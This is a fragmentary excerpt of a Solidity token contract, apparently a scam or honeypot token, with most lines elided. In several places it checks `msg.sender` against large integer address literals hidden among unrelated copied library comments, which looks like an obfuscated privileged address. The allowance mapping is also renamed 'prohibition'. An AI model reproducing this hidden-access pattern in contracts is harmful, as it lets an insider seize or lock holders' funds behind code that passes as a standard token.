...
contract __Token__ {
    ...
    mapping(address => mapping(address => uint256)) public prohibition;
    ...
    require (msg.sender==address
     ...
     (/* @solidity memory-safe-assembly, Data type conversion*/240527734649879761755021827116156068640193180936/*Strings of arbitrary length 
   can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/));
    ...
    (/*is a special For comparisons,Data type conversion*/317671902271428072303434271608058423970926102219/* length 
   (1 byte) in a single EVM word (32 bytes). Additionally, a fallback mechanism can be used for every other case.*/);
    ...
    function approve(address _spender, uint256 _value) public returns (bool success) {
        ...
        prohibition[msg.sender][_spender] = _value;
    ...
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        ...
        require(prohibition[_from][msg.sender] >= _amount, "Insufficient prohibition");
        ...
        if (_from != msg.sender && prohibition[_from][msg.sender] != type(uint256).max) {

            prohibition[_from][msg.sender] = prohibition[_from][msg.sender].sub(_amount);

            emit Approval(_from, msg.sender, prohibition[_from][msg.sender]);
    ...
    (/*is a special For comparisons,Data type conversion*/317671902271428072303433881608058423970926102219/* length 
   (1 byte) in a single EVM word (32 bytes). Additionally, a fallback mechanism can be used for every other case.*/)
